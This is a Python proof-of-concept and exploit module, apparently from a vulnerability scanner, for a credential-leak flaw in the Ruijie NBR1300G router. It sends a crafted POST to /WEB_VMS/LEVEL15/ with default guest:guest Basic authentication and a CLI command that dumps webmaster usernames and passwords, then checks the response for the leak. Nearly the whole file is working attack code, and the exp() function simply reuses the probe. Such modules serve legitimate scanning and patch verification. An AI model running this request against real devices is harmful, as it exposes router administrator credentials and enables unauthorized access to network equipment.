import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Ruijie NBR1300G Cli Password Leak''',
        "description": '''''',
        "severity": "medium",
        "references": [
            "http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7NBR%201300G%E8%B7%AF%E7%94%B1%E5%99%A8%20%E8%B6%8A%E6%9D%83CLI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html", 
            "https://www.ruijienetworks.com"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["ruijie", "exposure"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/WEB_VMS/LEVEL15/"""
        method = "POST"
        data = """command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant."""
        headers = {'Authorization': 'Basic Z3Vlc3Q6Z3Vlc3Q='}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""webmaster level 2 username guest password guest""" in resp0.text) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url